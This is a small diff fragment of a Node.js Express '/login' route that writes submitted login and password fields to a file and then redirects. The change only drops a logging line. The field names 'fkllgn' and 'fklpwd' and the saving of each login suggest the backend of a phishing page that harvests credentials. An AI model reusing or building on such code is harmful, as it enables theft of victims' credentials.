@@ -23,8 +23,6 @@ app.post('/login', (req, res) => fs.appendFile(
   getReport(req.body.fkllgn, req.body.fklpwd),
   (err) => {
     if (err) throw err;
-    console.log('new login saved');
-
     res.writeHead(301, {'Location': 'http://localhost'});
     res.send();
   }
